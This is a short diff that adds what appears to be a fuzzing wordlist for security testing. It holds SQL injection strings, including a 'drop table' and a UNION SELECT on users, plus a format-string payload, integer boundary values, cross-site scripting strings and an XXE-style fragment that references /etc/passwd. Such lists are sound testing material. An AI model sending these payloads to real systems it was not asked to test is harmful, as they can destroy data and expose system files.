@@ -1,0 +1,11 @@
+' ; drop table user –' or 1=1—
+%#7892302389x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+FUZZ*5000
+-1
+0xffffffff
+OR 1=1
+' OR '1'='1' UNION SELECT * FROM users
+IMG SRC=javascript:alert('XSS')>
+">script type="text/javascript"//
+'';!--"<XSS>=&{()}
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>"file:///etc/passwd">]<foo>&xee;</foo>
